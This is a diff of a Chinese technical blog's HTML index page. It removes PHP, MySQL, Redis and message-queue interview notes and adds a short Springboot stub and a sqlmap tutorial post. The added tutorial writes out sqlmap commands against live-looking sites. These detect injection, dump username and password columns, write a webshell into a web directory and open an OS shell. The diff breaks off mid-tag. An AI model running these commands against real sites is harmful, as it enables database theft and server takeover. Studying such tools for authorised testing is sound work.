-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface kk&#123; </span><br><span class="line">  public <span class="keyword">function</span> say(); </span><br><span class="line">&#125;</span><br><span class="line">class a &#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">show</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;我是父类&lt;br / &#x27;</span>; </span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br><span class="line">class b extends a implements kk&#123; </span><br><span class="line">  public <span class="keyword">function</span> <span class="function"><span class="title">say</span></span>()&#123; </span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;我是继承A类，同时实现say接口的&lt;br / &#x27;</span>; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=new b(); </span><br><span class="line"><span class="variable">$b</span>- show();//我是父类</span><br><span class="line"><span class="variable">$b</span>- say();//我是继承A类，同时实现say接口的</span><br></pre></td></tr></table></figure>
-
-<h4 id="2.4">微服务</h4>
-
-<p>优势：</p>
-<ul>
-<li>独立开发 – 所有微服务都可以根据各自的功能轻松开发</li>
-<li>独立部署 – 基于其服务，可以在任何应用程序中单独部署它们</li>
-<li>故障隔离 – 即使应用程序的一项服务不起作用，系统仍可继续运行</li>
-<li>混合技术堆栈 – 可以使用不同的语言和技术来构建同一应用程序的不同服务</li>
-<li>粒度缩放 – 单个组件可根据需要进行缩放，无需将所有组件缩放在一起</li>
-</ul>
-<p>特点：</p>
-<ul>
-<li>解耦 – 系统内的服务很大程度上是分离的。因此，整个应用程序可以轻松构建，更改和扩展</li>
-<li>组件化 – 微服务被视为可以轻松更换和升级的独立组件</li>
-<li>业务能力 – 微服务非常简单，专注于单一功能</li>
-<li>自治 – 开发人员和团队可以彼此独立工作，从而提高速度</li>
-<li>持续交付 – 通过软件创建，测试和批准的系统自动化，允许频繁发布软件</li>
-<li>责任 – 微服务不关注应用程序作为项目。相反，他们将应用程序视为他们负责的产品</li>
-<li>分散治理 – 重点是使用正确的工具来做正确的工作。这意味着没有标准化模式或任何技术模式。开发人员可以自由选择最有用的工具来解决他们的问题</li>
-<li>敏捷 – 微服务支持敏捷开发。任何新功能都可以快速开发并再次丢弃</li>
-</ul>
-<h4 id="2.5">垃圾回收机制</h4>
-
-<ul>
-<li>PHP垃圾回收机制</li>
-</ul>
-<p><code>PHP5.3版本</code>之前,使用的垃圾回收机制是单纯的“引用计数”<br>但是当两个或多个对象互相引用形成环状后，内存对象的计数器则不会消减为0,<br>这一组内存对象已经没用了，但是不能回收，从而导致内存泄露的现象<br>每个php变量存在一个叫”zval”的变量容器中。一个zval变量容器，除了包含变量的类型和值</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xdebug_debug_zval( <span class="string">&#x27;a&#x27;</span> ); <span class="comment"># Xdebug来检查引用计数情况</span></span><br></pre></td></tr></table></figure>
-<p>从<code>PHP7的NTS版本</code>开始，以上例程的引用将不再被计数<br>对于null，bool，int和double的类型变量，refcount永远不会计数；<br>对于对象、资源类型，refcount计数和php5的一致；<br>字符串引用，计数不变，&amp;地址发生改变<br>数组引用，键值不变的情况下计数<br>改变后引用全部作废，重新计算</p>
-<ul>
-<li>回收周期</li>
-</ul>
-<p><code>zend.enable_gc</code><code>php.ini</code>默认是打开的</p>
-<ul>
-<li>性能影响</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/benbenhan/articles/15904812.html">https://www.cnblogs.com/benbenhan/articles/15904812.html</a><br><a target="_blank" rel="noopener" href="https://docs.kilvn.com/tipi/chapt06/06-04-00-garbage-collection.html">https://docs.kilvn.com/tipi/chapt06/06-04-00-garbage-collection.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem=DRiKKpc8Q7W4D">https://xz.aliyun.com/t/11843?time__1311=Cq0xuD0DnD203GNem%3DDRiKKpc8Q7W4D</a></p>
-<h4 id="2.6">高并发优化</h4>
-
-<ul>
-<li>流量优化 - 防盗链处理</li>
-<li>前端优化<ol>
-<li>减少http请求次数</li>
-<li>添加异步请求</li>
-<li>启用浏览器缓存和文件压缩</li>
-<li>CDN加速</li>
-<li>建立独立的图片服务器(减少I&#x2F;O)</li>
-</ol>
-</li>
-<li>服务端优化<ol>
-<li>页面静态化</li>
-<li>并发处理</li>
-<li>队列处理</li>
-</ol>
-</li>
-<li>数据库优化<ol>
-<li>数据库缓存</li>
-<li>分库分表,分区</li>
-<li>读写分离</li>
-<li>负载均衡</li>
-</ol>
-</li>
-<li>web服务器优化<ol>
-<li>nginx反向代理实现负载均衡</li>
-<li>lvs实现负载均衡</li>
-</ol>
-</li>
-</ul>
-<h3 id="3">Mysql</h3>
-<h4 id="3.1">myisam和innodb区别以及事务四大特性</h4>
-
-<h4 id="3.2">mysql索引</h4>
-
-<blockquote>
-<p>从数据结构角度</p>
-</blockquote>
-<ul>
-<li>B+树索引(O(log(n)))：关于B+树索引，可以参考 MySQL索引背后的数据结构及算法原理</li>
-<li>hash索引：</li>
-</ul>
-<blockquote>
-<p>从物理存储角度</p>
-</blockquote>
-<ul>
-<li>聚集索引（clustered index）</li>
-<li>非聚集索引（non-clustered index）</li>
-</ul>
-<blockquote>
-<p>从逻辑角度</p>
-</blockquote>
-<ul>
-<li>主键索引：主键索引是一种特殊的唯一索引，不允许有空值</li>
-<li>普通索引或者单列索引</li>
-<li>多列索引（复合索引）：复合索引指多个字段上创建的索引，只有在查询条件中使用了创建索引时的第一个字段，索引才会被使用。使用复合索引时遵循最左前缀集合</li>
-<li>唯一索引或者非唯一索引</li>
-<li>空间索引：空间索引是对空间数据类型的字段建立的索引</li>
-</ul>
-<h4 id="3.3">主从-分区分表分库</h4>
-
-<ul>
-<li>分库：是为了解决数据库连接资源不足问题，和磁盘IO的性能瓶颈问题。</li>
-<li>分表：是为了解决单表数据量太大，sql语句查询数据时，即使走了索引也非常耗时问题。此外还可以解决消耗cpu资源问题。</li>
-<li>分库分表：可以解决 数据库连接资源不足、磁盘IO的性能瓶颈、检索数据耗时 和 消耗cpu资源等问题。</li>
-</ul>
-<p><a target="_blank" rel="noopener" href="https://github.com/DavidSuperM/davidsuperm.github.io/blob/master/DB/mysql%E5%88%86%E5%8C%BA%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%E6%96%B9%E6%A1%88.md">https://github.com/DavidSuperM/davidsuperm.github.io/blob/master/DB/mysql%E5%88%86%E5%8C%BA%E5%88%86%E8%A1%A8%E5%88%86%E5%BA%93%E6%96%B9%E6%A1%88.md</a></p>
-<h4 id="3.4">如何定位慢查询</h4>
-
-<ol>
-<li>首先确认是否开启了慢查询</li>
-<li>设置慢查询的时间限制</li>
-<li>查询慢查询日志可定位具体的慢sql</li>
-<li>相关sql查询</li>
-<li>用Explain分析具体的sql语句</li>
-</ol>
-<h3 id="5">Redis</h3>
-<h4 id="5.2">Redis常见数据结构</h4>
-
-<p>最常用的的有5种,字符串(String)、哈希(Hash)、列表(list)、集合(set)、有序集合(ZSET)</p>
-<blockquote>
-<p>元素唯一性：set中不允许重复的成员，而zset中不允许重复的成员，但是允许不同成员拥有相同的分数</p>
-</blockquote>
-<h4 id="5.3">Redis缓存雪崩、缓存穿透、缓存击穿</h4>
-
-
-<ul>
-<li><p>缓存雪崩<br>大量用户请求，全部转向请求访问数据库，压力剧增，可能导致数据库宕机，造成系统崩溃，造成缓存雪崩</p>
-</li>
-<li><p>缓存击穿<br>业务中几个数据会频繁访问，比如秒杀数据，被称为热点数据<br>如果某个热点数据过期了，此时大量用户请求，无法从缓存中读取，直接访问数据库，造成系统奔溃，缓存击穿</p>
-</li>
-<li><p>缓存穿透<br>当用户访问数据，既不在缓存中，也不在数据库，导致请求缓存时，发现缓存缺失，发现两者都没找到，没法构建缓存，</p>
-</li>
-</ul>
-<table>
-<thead>
-<tr>
-<th>缓存异常</th>
-<th>产生原因</th>
-<th>应对方案</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>缓存雪崩</td>
-<td>大量数据同时过期</td>
-<td>1.均匀设置过期时间 - 过期时间后加随机数，保证不会再同一时间过期 </br>  2.互斥锁 - 保证同一时间只有一个请求来构建缓存 </br> 3.后台更新缓存</td>
-</tr>
-<tr>
-<td></td>
-<td>Redis 故障宕机</td>
-<td>1.服务熔断或请求限流机制 </br>  2.构建 Redis 缓存高可靠集群</td>
-</tr>
-<tr>
-<td>缓存击穿</td>
-<td>热点数据过期</td>
-<td>1.互斥锁 </br> 2.不给热点数据设置过期时间，由后台异步更新缓存</td>
-</tr>
-<tr>
-<td>缓存穿透</td>
-<td>访问的数据既不在缓存，也不在数据库</td>
-<td>1.非法请求 </br> 2.缓存空值或者默认值 </br> 3.使用布隆过滤器快速判断数据是否存在</td>
-</tr>
-</tbody></table>
-<h4 id="5.4">Redis淘汰策略</h4>
-<h4 id="5.5">Redis分布式锁怎么实现</h4>
-<h4 id="5.6">Redis的持久化机制:RDB-vs-AOF</h4>
-<h4 id="5.7">Redis主从哨兵和集群的区别</h4>
-<h4 id="5.8">节点扩容不同</h4>
-
-
-<h3 id="6">MQ</h3>
-<h4 id="6.1">RabbitMQ,RocketMQ,Kafka区别</h4>
-
-
-<table>
-<thead>
-<tr>
-<th>MQ消息队列</th>
-<th>优点</th>
-<th>缺点</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>RabbitMQ</td>
-<td>轻量级、容易部署和使用、支持多种客户端开发语言、支持灵活的路由配置</td>
-<td>对消息堆积的支持并不好、性能和吞吐量较差、使用 Erlang 语言编写，比较难进行二次开发</td>
-</tr>
-<tr>
-<td>RocketMQ</td>
-<td>性能好、稳定可靠、有活跃的中文社区、使用 Java 开发，容易进行二次开发、特点响应快</td>
-<td>兼容性较差</td>
-</tr>
-<tr>
-<td>Kafka</td>
-<td>兼容性极好、设计上大量使用了批量和异步的思想，有超高的性能</td>
-<td>由于 “先攒一波再一起处理” 的设计，时延较高，不太适合在线业务场景</td>
-</tr>
-</tbody></table>
-<h3 id="7">服务器&其它方面</h3>
-<h4 id="7.1">swoole</h4>
-
-<p>Swoole是一个面向生产环境的PHP 异步网络通信引擎，使PHP 开发人员可以编写高性能的异步并发TCP、UDP、Unix Socket、HTTP，WebSocket 服务</p>
-<h4 id="7.2">phpunit</h4>
-
-<p>PHPUnit 是 PHP 程式语言中最常见的单元测试 (unit testing) 框架，PHPUnit 是参考 xUnit 架构利用 PHP 实作出来。</p>
-<ol>
-<li>针对类 Example 的测试写在类 ExampleTest 中, ExampleTest 继承自 TestCase</li>
-<li>对于方法的测试命名为 test* 的公用方法</li>
-<li>在测试方法内，类似于 assertEquals() 的断言方法用来对实际值和预期值的匹配做出验证</li>
-</ol>
-<h4 id="7.3">php-cs-fixer</h4>
-
-<p>php-cs-fixer 是个代码格式化工具，格式化的标准是 PSR-1、PSR-2 以及一些 symfony 的标准。</p>
-<ul>
-<li>–verbose 用于展示应用了的规则<blockquote>
-<p>–verbose</p>
-</blockquote>
-</li>
-<li>–using-cache 不使用缓存<blockquote>
-<p>–using-cache&#x3D;no</p>
-</blockquote>
-</li>
-<li>–config 指定配置文件<blockquote>
-<p>–config&#x3D;.php-cs-fixer.php</p>
-</blockquote>
-</li>
-<li>–level 用于控制需要使用的规则层级（默认psr2）<blockquote>
-<p>–level&#x3D;psr0<br>–level&#x3D;psr1<br>–level&#x3D;psr2<br>–level&#x3D;symfony</p>
-</blockquote>
-</li>
-<li>–fixers 默认情况下执行的是 PSR-2 的所有选项以及一些附加选项（主要是 symfony 相关的）。还有一些属于『贡献级别』的选项，你可以通过 –fixers 选择性的添加，–fixers 的多个条件要用逗号分开<blockquote>
-<p>–fixers&#x3D;linefeed,short_tag,indentation</p>
-</blockquote>
-</li>
-<li>-name_of_fixer 设定禁用哪些选项。如果同时设定了 –fixers 和 -name_of_fixer，前者的优先级更高</li>
-<li>–dry-run 和 –diff 可以显示出需要修改的汇总，但是并不实际修改<blockquote>
-<p>.&#x2F;vendor&#x2F;bin&#x2F;php-cs-fixer fix –verbose –diff –dry-run</p>
-</blockquote>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="comment"># vendor/bin/php-cs-fixer fix --config=.php-cs-fixer.dist.php --dry-run --diff</span></span><br><span class="line"><span class="comment"># vendor/bin/php-cs-fixer fix --config=.php-cs-fixer.dist.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$finder</span> = PhpCsFixer\Finder::create()</span><br><span class="line">    -&gt;<span class="keyword">in</span>(__DIR__)</span><br><span class="line">    -&gt;name(<span class="string">&#x27;*.php&#x27;</span>)</span><br><span class="line">    -&gt;notName(<span class="string">&#x27;*.blade.php&#x27;</span>); // 排除一些文件类型</span><br><span class="line"></span><br><span class="line"><span class="built_in">return</span> (new PhpCsFixer\Config())</span><br><span class="line">    -&gt;setUsingCache(<span class="literal">false</span>)  // 禁用缓存</span><br><span class="line">    -&gt;setRules([</span><br><span class="line">        <span class="string">&#x27;@PSR12&#x27;</span> =&gt; <span class="literal">true</span>,                      // 使用 PSR-12 标准</span><br><span class="line">        <span class="string">&#x27;no_unused_imports&#x27;</span> =&gt; <span class="literal">true</span>,            // 移除未使用的导入</span><br><span class="line">        <span class="string">&#x27;standardize_not_equals&#x27;</span> =&gt; <span class="literal">true</span>,       // 使用 `!==` 而不是 `&lt;&gt;`</span><br><span class="line">        <span class="string">&#x27;array_indentation&#x27;</span> =&gt; <span class="literal">true</span>,            // 数组缩进一致</span><br><span class="line">        <span class="string">&#x27;binary_operator_spaces&#x27;</span> =&gt; [<span class="string">&#x27;default&#x27;</span> =&gt; <span class="string">&#x27;align&#x27;</span>],  // 二元运算符对齐</span><br><span class="line">        <span class="string">&#x27;no_extra_blank_lines&#x27;</span> =&gt; <span class="literal">true</span>,         // 删除多余空行</span><br><span class="line">        <span class="string">&#x27;visibility_required&#x27;</span> =&gt; [<span class="string">&#x27;elements&#x27;</span> =&gt; [<span class="string">&#x27;property&#x27;</span>, <span class="string">&#x27;method&#x27;</span>]],  // 强制声明可见性</span><br><span class="line">        <span class="string">&#x27;no_trailing_whitespace&#x27;</span> =&gt; <span class="literal">true</span>,       // 删除行尾空白</span><br><span class="line">        <span class="string">&#x27;linebreak_after_opening_tag&#x27;</span> =&gt; <span class="literal">true</span>,  // 在 PHP 开标签后换行</span><br><span class="line">        <span class="string">&#x27;cast_spaces&#x27;</span> =&gt; [<span class="string">&#x27;space&#x27;</span> =&gt; <span class="string">&#x27;single&#x27;</span>], // 类型转换间隔为单空格</span><br><span class="line">        <span class="string">&#x27;align_multiline_comment&#x27;</span> =&gt; <span class="literal">true</span>,      // 多行注释对齐</span><br><span class="line">        <span class="string">&#x27;ternary_operator_spaces&#x27;</span> =&gt; <span class="literal">true</span>,      // 三元运算符间空格</span><br><span class="line">        <span class="string">&#x27;no_blank_lines_after_phpdoc&#x27;</span> =&gt; <span class="literal">true</span>,  // PHPDoc 后不允许空行</span><br><span class="line">        <span class="string">&#x27;method_argument_space&#x27;</span> =&gt; [<span class="string">&#x27;on_multiline&#x27;</span> =&gt; <span class="string">&#x27;ensure_fully_multiline&#x27;</span>],  // 方法参数一致性</span><br><span class="line">    ])</span><br><span class="line">    -&gt;setFinder(<span class="variable">$finder</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="7.4">docker多版本启动共用</h4>
-
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2025/05/28/php-structure/">
-                PHP框架
+            <a href="/2025/05/28/springboot/">
+                Springboot
             </a>
         </h1>
         <div class="post-info">
@@ -826,24 +297,8 @@
 
     
         <div class="content">
-            <h2 id="thinkpkp-讨论"><a href="#thinkpkp-讨论" class="headerlink" title="thinkpkp 讨论"></a>thinkpkp 讨论</h2><h3 id="thinkphp-6以上适用命令"><a href="#thinkphp-6以上适用命令" class="headerlink" title="thinkphp 6以上适用命令"></a>thinkphp 6以上适用命令</h3><ul>
-<li>创建单例</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建多例</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-multi-app</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建两个模型</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php think build admin</span><br><span class="line">php think build api</span><br></pre></td></tr></table></figure>
-<ul>
-<li>创建多层试图</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer require topthink/think-view</span><br></pre></td></tr></table></figure>
-
-
+            <p>文章</p>
+<h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h2 id="微服务-dubbo-zookeeper"><a href="#微服务-dubbo-zookeeper" class="headerlink" title="微服务 dubbo - zookeeper"></a>微服务 dubbo - zookeeper</h2><h2 id="样式"><a href="#样式" class="headerlink" title="样式"></a>样式</h2><h3 id="undertow-对比-tomcat"><a href="#undertow-对比-tomcat" class="headerlink" title="undertow 对比 tomcat"></a>undertow 对比 tomcat</h3>
         </div>
     
 
@@ -854,8 +309,8 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2025/05/28/pressure-testing/">
-                压测工具集合
+            <a href="/2025/05/28/sqlmap/">
+                SQLMap
             </a>
         </h1>
         <div class="post-info">
@@ -865,7 +320,7 @@
             
             
                 <span class="category">
-                    <a href="/categories/测试工具/">测试工具</a>
+                    <a href="/categories/渗透工具/">渗透工具</a>
                 </span>
             
         </div>
@@ -873,19 +328,654 @@
 
     
         <div class="content">
-            <h1 id="并发请求处理"><a href="#并发请求处理" class="headerlink" title="并发请求处理"></a>并发请求处理</h1><ul>
-<li>HTTP&#x2F;HTTPS 接口：测试 Web API、RESTful 接口的吞吐量、QPS（每秒请求数）。</li>
-<li>数据库查询：高并发查询数据库，看是否会出现锁等待、死锁、超时等问题。</li>
-<li>后台任务：队列、定时任务（如 RabbitMQ、Kafka）在高负载下的稳定性。</li>
+            <p>文章</p>
+<h2 id="网络安全"><a href="#网络安全" class="headerlink" title="网络安全"></a>网络安全</h2><h3 id="分类文章"><a href="#分类文章" class="headerlink" title="分类文章"></a>分类文章</h3><h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	http://www.vuln.cn/1992<br />
+</h3>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap简介
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持五种不同的注入模式：
+</p>
+<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		4、联合查询注入，可以使用union的情况下的注入。
+	</li>
+	<li style="list-style:square;margin-left:15px;color:#666666;">
+		5、堆查询注入，可以同时执行多条语句的执行时的注入。
+	</li>
 </ul>
-<h2 id="k6"><a href="#k6" class="headerlink" title="k6"></a>k6</h2><p>k6 是一个压力测试套件，使用 golang 编写。主要特性有：</p>
-<ul>
-<li>提供了友好的 CLI 工具</li>
-<li>使用 JavaScript 代码编写测试用例</li>
-<li>可以根据性能条件设置阈值，表明成功还是失败</li>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	sqlmap支持的数据库有
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	检测注入
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	基本格式
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	默认使用level1检测全部数据库类型
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	跟随302跳转
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，<br />
+当注入错误的时候，先报错再跳转的时候，不需要跟随302。<br />
+目的就是：要追踪到错误信息。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	cookie注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	当程序有防get注入的时候，可以使用cookie注入<br />
+sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从post数据包中注入
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	可以使用burpsuite或者temperdata等工具来抓取post包
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql &nbsp; &nbsp;指定username参数
+</p>
+<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	注入成功后
+</h2>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	获取数据库基本信息
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 --dbs
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询有哪些数据库
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test --tables
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中有哪些表
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin --columns
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	查询test数据库中admin表有哪些字段
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin -C "username,password" --dump
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	dump出字段username与password中的数据
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	其他命令参考下面
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	从数据库中搜索字段
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password<br />
+在dedecms数据库中搜索字段admin或者password。
+</p>
+<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
+	读取与写入文件
+</h3>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	首先找需要网站的物理路径，其次需要有可写或可读权限。
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br />
+--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br />
+--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br />
+#示例：<br />
+sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	使用shell命令：
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
+	sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell<br />
+接下来指定网站可写目录：<br />
+“E:\php\htdocs\dvwa”
+</p>
+<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
